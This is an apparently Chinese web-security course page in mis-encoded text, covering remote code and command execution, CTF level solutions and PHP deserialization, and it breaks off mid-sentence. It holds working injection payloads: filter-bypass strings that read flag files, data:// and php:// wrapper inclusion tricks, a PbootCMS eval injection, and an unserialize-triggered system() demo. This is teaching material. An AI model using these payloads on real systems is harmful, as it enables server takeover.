<h4 id="é»‘ç›’æ¢é’ˆ"><a href="#é»‘ç›’æ¢é’ˆ" class="headerlink" title="#é»‘ç›’æ¢é’ˆ"></a>#é»‘ç›’æ¢é’ˆ</h4><p>1ã€URLå‚æ•°ååŠå‚æ•°å€¼åˆ†æï¼š<br>å‚æ•°åï¼šè‹±æ–‡å¯¹åº”ç¿»è¯‘<br>å‚æ•°å€¼ï¼šç›®å½•æˆ–æ–‡ä»¶å<br>2ã€åŠŸèƒ½ç‚¹è‡ªè¡Œä¿®æ”¹ååˆ†æï¼š<br>æ–‡ä»¶ä¸‹è½½ï¼Œå†Œé™¤ï¼Œè¯»å–ç­‰</p>
<h1 id="ç¬¬44å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-RCE-ä»£ç æ‰§è¡Œ-å‘½ä»¤æ‰§è¡Œ-å¤šå±‚é¢æ£€æµ‹åˆ©ç”¨"><a href="#ç¬¬44å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-RCE-ä»£ç æ‰§è¡Œ-å‘½ä»¤æ‰§è¡Œ-å¤šå±‚é¢æ£€æµ‹åˆ©ç”¨" class="headerlink" title="ç¬¬44å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;RCE&amp;ä»£ç æ‰§è¡Œ&amp;å‘½ä»¤æ‰§è¡Œ&amp;å¤šå±‚é¢æ£€æµ‹åˆ©ç”¨"></a>ç¬¬44å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;RCE&amp;ä»£ç æ‰§è¡Œ&amp;å‘½ä»¤æ‰§è¡Œ&amp;å¤šå±‚é¢æ£€æµ‹åˆ©ç”¨</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-24"><a href="#çŸ¥è¯†ç‚¹ï¼š-24" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€RCEæ‰§è¡Œ-ä»£ç æ‰§è¡Œ&amp;å‘½ä»¤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>);   <span class="comment">//ä»£ç æ‰§è¡Œ</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;ver&#x27;</span>);     <span class="comment">//å‘½ä»¤æ‰§è¡Œ    è¿™ä¸¤ç§è¦åŒºåˆ†</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>å‘½ä»¤æ‰§è¡ŒæŒ‡çš„æ˜¯æ”»å‡»è€…é€šè¿‡åœ¨ Webåº”ç”¨ç¨‹åºä¸­æ³¨å…¥æ¶æ„å‘½ä»¤ï¼Œä»è€Œæ‰§è¡Œéæ³•æ“ä½œã€‚æ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨å¯ç¼–è¾‘çš„å‚æ•°æˆ–è¡¨å•å­—æ®µï¼Œåœ¨æ³¨å…¥æ—¶è¾“å…¥ä¸€äº›åŒ…å«ç³»ç»Ÿå‘½ä»¤çš„å­—ç¬¦ï¼Œä½¿å¾— Web ç¨‹åºæŠŠè¿™äº›å­—ç¬¦ä½œä¸ºå‘½ä»¤æ‰§è¡Œã€‚æˆåŠŸçš„æ”»å‡»å¯ä»¥å¯¼è‡´ Web æœåŠ¡å™¨å—åˆ°æ§åˆ¶ï¼Œç”šè‡³å¯ä»¥çªƒå–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åç³»ç»Ÿã€‚<br>ä»£ç æ‰§è¡ŒæŒ‡çš„æ˜¯æ”»å‡»è€…é€šè¿‡åœ¨ Webåº”ç”¨ç¨‹åºä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œä»è€Œè®©å…¶åœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œã€‚æ”»å‡»è€…é€šå¸¸ä¼šåˆ©ç”¨å¯ç¼–è¾‘çš„å‚æ•°æˆ–è¡¨å•å­—æ®µï¼Œåœ¨æ³¨å…¥æ—¶è¾“å…¥ä¸€äº›åŒ…å«æ¶æ„è„šæœ¬çš„å­—ç¬¦ï¼Œä½¿å¾— Webç¨‹åºåœ¨è§£ææ—¶æŠŠè¿™äº›å­—ç¬¦ç›´æ¥å½“åšä»£ç æ‰§è¡Œã€‚æˆåŠŸçš„æ”»å‡»å¯ä»¥å¯¼è‡´ Web æœåŠ¡å™¨å—åˆ°æ§åˆ¶ï¼Œç”šè‡³å¯ä»¥çªƒå–æ•æ„Ÿä¿¡æ¯æˆ–ç ´åç³»ç»Ÿã€‚</p>
</blockquote>
<p>2ã€CTFè€ƒç‚¹-æ¼æ´é…åˆ&amp;ç»•è¿‡æ‰‹æ³•<br>3ã€åˆ©ç”¨å®¡è®¡-CMSæ¡†æ¶&amp;ä¸­é—´ä»¶ç­‰</p>
<h4 id="è¯¦ç»†ç‚¹ï¼š-9"><a href="#è¯¦ç»†ç‚¹ï¼š-9" class="headerlink" title="#è¯¦ç»†ç‚¹ï¼š"></a>#è¯¦ç»†ç‚¹ï¼š</h4><p>1.ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿæ­¤ç±»å®‰å…¨é—®é¢˜<br>2æ­¤ç±»å®‰å…¨é—®é¢˜æ¢é’ˆåˆ©ç”¨åŠå±å®³<br>3.æ­¤ç±»å®‰å…¨é—®é¢˜åœ¨CTFå³CMSåˆ†æ<br>æ¼æ´åœºæ™¯ï¼šä»£ç ä¼šè°ƒç”¨è‡ªèº«çš„è„šæœ¬ä»£ç æ‰§è¡Œï¼Œä¹Ÿä¼šè°ƒç”¨ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ<br>æ¼æ´åŒºåˆ«ï¼šè„šæœ¬è¯­è¨€&amp;æ“ä½œç³»ç»Ÿ(php&#x2F;java&#x2F;python&#x2F;js&amp;windows&#x2F;&#x2F;linux&#x2F;mac)<br>æ¼æ´å¯¹è±¡ï¼šWEBæºç &amp;ä¸­é—´ä»¶&amp;å…¶ä»–ç¯å¢ƒï¼ˆè§æ¼æ´è¯¦æƒ…å¯¹è±¡ï¼‰<br>æ¼æ´å±å®³ï¼šç›´æ¥æƒé™ä¸¢å¤±ï¼Œå¯æ‰§è¡Œä»»æ„å´æœ¬ä»£ç æˆ–ç³»ç»Ÿå‘½ä»¤</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-21"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-21" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><p>RCE-åŸç†&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;å±å®³ç­‰<br>CTF-29-39-RCEä»£ç å‘½ä»¤æ‰§è¡Œ<br>CMS-PbootCMSå®¡è®¡-RCEæ‰§è¡Œ<br>å±‚é¢-æ¢é’ˆ-è¯­è¨€&amp;CMS&amp;ä¸­é—´ä»¶ç­‰</p>
<h4 id="RCE-åŸç†-æ¢é’ˆ-åˆ©ç”¨-å±å®³ç­‰"><a href="#RCE-åŸç†-æ¢é’ˆ-åˆ©ç”¨-å±å®³ç­‰" class="headerlink" title="#RCE-åŸç†&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;å±å®³ç­‰"></a>#RCE-åŸç†&amp;æ¢é’ˆ&amp;åˆ©ç”¨&amp;å±å®³ç­‰</h4><p>ä¸¾ä¾‹ï¼š</p>
<?php evalä»£ç æ‰§è¡Œ eval(phpinfoï¼ˆï¼‰ //systemå‘½ä»¤æ‰§è¡Œ system(ipconfig'); ?>
<p>-RCEä»£ç æ‰§è¡Œï¼šå¼•ç”¨è„šæœ¬ä»£ç è§£ææ‰§è¡Œ<br>RCEå‘½ä»¤æ‰§è¡Œï¼šè„šæœ¬è°ƒç”¨æ“ä½œç³»ç»Ÿå‘½ä»¤<br>æ¼æ´å‡½æ•°ï¼š</p>
<blockquote>
<p>1.PHP: evalï¼ˆï¼‰.assert()ã€preg_replace()ã€call_user_funcï¼ˆ)ã€all_user_func_array()ä»¥åŠaray_map()ç­‰<br>systemã€shell_execã€popenã€passthruã€proc_openç­‰<br>2.Python eval exec subprocess os.system commands<br>3.Java: Javaä¸­æ²¡æœ‰ç±»ä¼¼phpä¸­evalå‡½æ•°è¿™ç§äº˜æ¥å¯ä»¥å°†å­—ç¬¦ç‰è½¬åŒ–ä¸ºä»£ç æ‰§è¡Œçš„å‡½æ•°ï¼Œ ä½†æ˜¯æœ‰åå°„æœºåˆ¶ï¼Œå¹¶ä¸”æœ‰å„ç§åŸºäºåå°„æœºåˆ¶çš„è¡¨è¾¾å¼æ“ï¼Œå¦‚ï¼šOGNLã€SpELã€MVELç­‰</p>
</blockquote>
<p><strong>CTF-29-39-RCEä»£ç å‘½ä»¤æ‰§è¡Œ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">29å…³</span><br><span class="line">æ€è·¯ï¼šçœ‹ä»£ç è¿‡æ»¤äº†flagå¤§å°å†™æ ¼å¼ï¼Œä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ ?c=system(â€˜tac fla*.phpâ€™);</span><br><span class="line"></span><br><span class="line">30å…³</span><br><span class="line">æ€è·¯ï¼šçœ‹ä»£ç é™¤äº†è¿‡æ»¤flagè¿˜è¿‡æ»¤äº†systemã€phpçš„å¤§å°å†™ï¼Œä½¿ç”¨shell_execç»•è¿‡ /?c=echo shell_exec(â€˜tac fla*â€™);</span><br><span class="line"></span><br><span class="line">â€˜cp fla*.ph* 2.txtâ€™:</span><br><span class="line">echo shell exec(â€˜tac fla*.ph*â€™);</span><br></pre></td></tr></table></figure>

<p>31-å‚æ•°é€ƒé€¸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval($GET[1]):&amp;1=system(â€˜tac flag.phpâ€™);</span><br><span class="line">æ€è·¯ï¼šå†ä¸Šä¸€å…³çš„åŸºç¡€ä¸Šå¢åŠ è¿‡æ»¤shell_exec cat sortç­‰å‡½æ•°ï¼Œè¿™æ—¶å€™å¯ä»¥ç”¨å‚æ•°é€ƒé€¸ï¼Œåˆ›å»ºæ–°å‚æ•°ç„¶åè®©æ–°å‚æ•°æ‰§è¡Œå‘½ä»¤</span><br></pre></td></tr></table></figure>

<p>32~36-é…åˆåŒ…å«&amp;ä¼ªåè®®</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="variable">$_</span> GET[a]<span class="meta">?&gt;</span>&amp;a=data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br><span class="line"><span class="keyword">include</span><span class="variable">$_GET</span>[a]<span class="meta">?&gt;</span>&amp;a=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line">æ€è·¯ï¼šè¿‡æ»¤äº†ï¼›åˆ†å·è‡´ä½¿è¯­å¥ä¸èƒ½ç»“æŸæ‰§è¡Œï¼Œä½¿ç”¨<span class="keyword">include</span> <span class="meta">?&gt;</span>ç»“æŸè¯­å¥ç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«ä¸­çš„ä¼ªåè®®è¿›è¡Œè¯»å–</span><br></pre></td></tr></table></figure>

<p>37~39-åŒ…å«&amp;ä¼ªåè®®&amp;é€šé…ç¬¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain,&lt;?=system(&#x27;tac fla);?&gt;</span></span><br><span class="line">php:<span class="comment">//input post&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ€è·¯ï¼šç›´æ¥åˆ©ç”¨æ–‡ä»¶åŒ…å«ï¼ŒåŒæ—¶ä½¿ç”¨é€šé…ç¬¦ç»•è¿‡php flagè¿‡æ»¤</p>
<h4 id="ä»£ç å®¡è®¡-PbootCMS-RCEä»£ç æ‰§è¡Œ"><a href="#ä»£ç å®¡è®¡-PbootCMS-RCEä»£ç æ‰§è¡Œ" class="headerlink" title="#ä»£ç å®¡è®¡-PbootCMS-RCEä»£ç æ‰§è¡Œ"></a>#ä»£ç å®¡è®¡-PbootCMS-RCEä»£ç æ‰§è¡Œ</h4><p>æµç¨‹ï¼šæœç´¢ç‰¹å®šå‡½æ•°-&gt;parserlfLabe-&gt;parserCommom-&gt;About&amp;Content-&gt;æ„é€ <br>AboutController:(pboot:if(eval($_POST[1])))&#x2F;pbootif)<br>ContentController:&#x2F;index.php&#x2F;Content&#x2F;2?keyword&#x3D;(pboot:if(eval(S_REQUEST[1]))ğŸ˜•&#x2F;)))))<br>(&#x2F;pbootin&amp;1&#x3D;phpintoï¼ˆï¼‰;</p>
<h4 id="å±‚é¢-æ¢é’ˆ-è¯­è¨€-CMSæ¡†æ¶-ä¸­é—´ä»¶"><a href="#å±‚é¢-æ¢é’ˆ-è¯­è¨€-CMSæ¡†æ¶-ä¸­é—´ä»¶" class="headerlink" title="#å±‚é¢-æ¢é’ˆ-è¯­è¨€&amp;CMSæ¡†æ¶&amp;ä¸­é—´ä»¶"></a>#å±‚é¢-æ¢é’ˆ-è¯­è¨€&amp;CMSæ¡†æ¶&amp;ä¸­é—´ä»¶</h4><p><a href="http://vulfocus.io/">http://vulfocus.io/</a> Shiro weblogic<br>ä½¿ç”¨å·¥å…·å¿«é€Ÿæ‹¿ä¸‹æƒé™</p>
<h1 id="ç¬¬45å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-PHPååºåˆ—åŒ–-POPé“¾æ„é€ -é­”æœ¯æ–¹æ³•-åŸç”Ÿç±»"><a href="#ç¬¬45å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´-PHPååºåˆ—åŒ–-POPé“¾æ„é€ -é­”æœ¯æ–¹æ³•-åŸç”Ÿç±»" class="headerlink" title="ç¬¬45å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;PHPååºåˆ—åŒ–&amp;POPé“¾æ„é€ &amp;é­”æœ¯æ–¹æ³•&amp;åŸç”Ÿç±»"></a>ç¬¬45å¤©ï¼šWEBæ”»é˜²-é€šç”¨æ¼æ´&amp;PHPååºåˆ—åŒ–&amp;POPé“¾æ„é€ &amp;é­”æœ¯æ–¹æ³•&amp;åŸç”Ÿç±»</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-25"><a href="#çŸ¥è¯†ç‚¹ï¼š-25" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€ä»€ä¹ˆæ˜¯ååºåˆ—åŒ–æ“ä½œï¼Ÿæ ¼å¼è½¬æ¢<br>2ã€ä¸ºä»€ä¹ˆä¼šå‡ºç°å®‰å…¨æ¼æ´ï¼Ÿé­”æœ¯æ–¹æ³•<br>3ã€ååºåˆ—åŒ–æ¼æ´å¦‚ä½•å‘ç°ï¼Ÿå¯¹è±¡é€»è¾‘<br>4ã€ååºåˆ—åŒ–æ¼æ´å¦‚ä½•åˆ©ç”¨ï¼Ÿ-POPé“¾æ„é€ <br>è¡¥å……ï¼šååºåˆ—åŒ–åˆ©ç”¨å¤§æ¦‚åˆ†ç±»ä¸‰ç±»<br>é­”æœ¯æ–¹æ³•çš„è°ƒç”¨é€»è¾‘å¦‚è§¦å‘æ¡ä»¶<br>è¯­è¨€åŸç”Ÿç±»çš„è°ƒç”¨é€»è¾‘å¦‚SoapClient<br>-è¯­è¨€è‡ªèº«çš„å®‰å…¨ç¼ºé™·å¦‚CVE-2016-7124</p>
<h4 id="ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š"><a href="#ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š" class="headerlink" title="#ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š"></a>#ååºåˆ—åŒ–è¯¾ç¨‹ç‚¹ï¼š</h4><p>-PHP&amp;Java&amp;Python</p>
<blockquote>
<p>è¿™è¾¹æ³¨æ„çš„æ˜¯ï¼Œååºåˆ—åŒ–æ¼æ´åœ¨CTFä¸­ç»å¸¸ä¼šè€ƒåˆ°ï¼Œè€Œä¸”å®æˆ˜é¢è¯•ä¹Ÿæ˜¯ä¸€å¤§è€ƒç‚¹</p>
</blockquote>
<p>åºåˆ—åŒ–ï¼šå¯¹è±¡è½¬æ¢ä¸ºæ•°ç»„æˆ–å­—ç¬¦ä¸²ç­‰æ ¼å¼<br>ååºåˆ—åŒ–ï¼šå°†æ•°ç»„æˆ–å­—ç¬¦ä¸²ç­‰æ ¼å¼è½¬æ¢æˆå¯¹è±¡<br>serialize() &#x2F;&#x2F;å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²<br>unserialize()&#x2F;&#x2F;å°†å­—ç¬¦ä¸²è¿˜åŸæˆä¸€ä¸ªå¯¹è±¡</p>
<h4 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="#PHPååºåˆ—åŒ–æ¼æ´"></a>#PHPååºåˆ—åŒ–æ¼æ´</h4><p>åŸç†ï¼šæœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œä»è€Œ<br>å¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQLæ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›<br>é­”æœ¯æ–¹æ³•ã€‚å½“è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™å°±æœ‰å¯èƒ½ä¼šè§¦å‘å¯¹è±¡ä¸­çš„ä¸€äº›é­”æœ¯æ–¹æ³•ã€‚</p>
<h4 id="é­”æœ¯æ–¹æ³•åˆ©ç”¨ç‚¹åˆ†æï¼š"><a href="#é­”æœ¯æ–¹æ³•åˆ©ç”¨ç‚¹åˆ†æï¼š" class="headerlink" title="#é­”æœ¯æ–¹æ³•åˆ©ç”¨ç‚¹åˆ†æï¼š"></a>#é­”æœ¯æ–¹æ³•åˆ©ç”¨ç‚¹åˆ†æï¼š</h4><p>è§¦å‘ï¼šunserializeå‡½æ•°çš„å˜é‡å¯æ§ï¼Œæ–‡ä»¶ä¸­å­˜åœ¨å¯åˆ©ç”¨çš„ç±»ï¼Œç±»ä¸­æœ‰é­”æœ¯æ–¹æ³•ï¼š</p>
<p>é­”æœ¯æ–¹æ³•æ˜¯PHPååºåˆ—åŒ–ä¸­å¯»æ‰¾æ¼æ´çš„é‡ç‚¹ä¹‹ä¸€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():<span class="comment">//æ„é€ å‡½æ•°ï¼Œå½“å¯¹è±¡newçš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():<span class="comment">//ææ„å‡½æ•°å½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="comment">//unserialize()æ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__callStatci</span>(): <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()å‡½æ•°ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³•__sleep() å¦‚æœå­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šè¢«ä¼˜å…ˆè°ƒç”¨</span></span><br></pre></td></tr></table></figure>

<p><strong>æ¼”ç¤ºåºåˆ—åŒ–å’Œååºåˆ—æ“ä½œï¼Œå°†å¯¹è±¡è½¬åŒ–æˆæ•°ç»„æˆ–å­—ç¬¦ä¸²</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åºåˆ—åŒ–&amp;ååºåˆ—åŒ–</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demotest</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;xiaodi&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&#x27;29&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$example</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demotest</span>();</span><br><span class="line"><span class="variable">$s</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$example</span>);<span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>);<span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$u</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">//O:8:&quot;demotest&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;xiaodi&quot;;s:3:&quot;sex&quot;;s:3:&quot;man&quot;;s:3:&quot;age&quot;;s:2:&quot;29&quot;;&#125;</span></span><br><span class="line"><span class="comment">//object(demotest)#2 (3) &#123; [&quot;name&quot;]=&gt; string(6) &quot;xiaodi&quot; [&quot;sex&quot;]=&gt; string(3) &quot;man&quot; [&quot;age&quot;]=&gt; string(2) &quot;29&quot; &#125;</span></span><br></pre></td></tr></table></figure>

<p><strong>æ¼”ç¤ºåˆ›å»ºå¯¹è±¡å³å¯è§¦å‘__constructé­”æœ¯æ–¹æ³•ï¼Œé”€æ¯å¯¹è±¡è§¦å‘__destructï¼ŒæŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__toString()</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å®‰å…¨é—®é¢˜</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$var</span>=<span class="string">&#x27;echo test&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;x&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;__construct&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;__toString&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ— éœ€å‡½æ•°ï¼Œåˆ›å»ºå¯¹è±¡è§¦å‘é­”æœ¯æ–¹æ³•</span></span><br><span class="line"><span class="comment">//$a=new A();//è§¦å‘__construct</span></span><br><span class="line"><span class="comment">//$a-&gt;test();//è§¦å‘test</span></span><br><span class="line"><span class="comment">//echo $a;//è§¦å‘__toString</span></span><br><span class="line"><span class="comment">//è§¦å‘__destruct</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:1:&quot;A&quot;:1:&#123;s:3:&quot;var&quot;;s:9:&quot;echo test&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br></pre></td></tr></table></figure>

<p><strong>æ­¤å¤„åˆ›å»ºæ–°å¯¹è±¡ä¼šè‡ªåŠ¨å…ˆè¾“å‡ºxiaodisecç„¶åæ‰§è¡Œipconfigï¼Œæ­¤å¤„ä¼ å‚å°†å‚æ•°ååºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è§¦å‘__destruct()æ‰§è¡Œipconfigå‘½ä»¤</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//æ¼æ´å‡ºç°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ipconfig&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;xiaodisec&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å‡½æ•°å¼•ç”¨ï¼Œæ— å¯¹è±¡åˆ›å»ºè§¦å‘é­”æœ¯æ–¹æ³•</span></span><br><span class="line"><span class="comment">//?x=O:1:&quot;B&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;ver&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[x]);</span><br><span class="line"><span class="comment">//$b=new b();</span></span><br><span class="line"><span class="comment">//echo serialize($b);</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ­¤å¤„ç®—æ˜¯æ­£å¼åˆ©ç”¨ååºåˆ—åŒ–è§¦å‘<span class="title function_ invoke__">__destruct</span>(),æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ipconfigï¼Œåœ¨å‡½æ•°å¼•ç”¨æ—¶ï¼Œä½¿ç”¨äº†ååºåˆ—åŒ–æ¼æ´çš„æ–¹å¼æ¥æ„é€ äº†ä¸€ä¸ªæ¶æ„å¯¹è±¡ï¼Œ</span><br><span class="line">ç”±äºåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè§¦å‘ <span class="title function_ invoke__">__destruct</span>() æ–¹æ³•çš„æ‰§è¡Œï¼Œå› æ­¤å¯ä»¥é€šè¿‡æ„é€ æ¶æ„å¯¹è±¡æ¥æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚</span><br><span class="line">å…·ä½“æ¥è¯´ï¼Œå½“æˆ‘ä»¬é€šè¿‡è®¿é—®é“¾æ¥ ?c=O:<span class="number">1</span>:<span 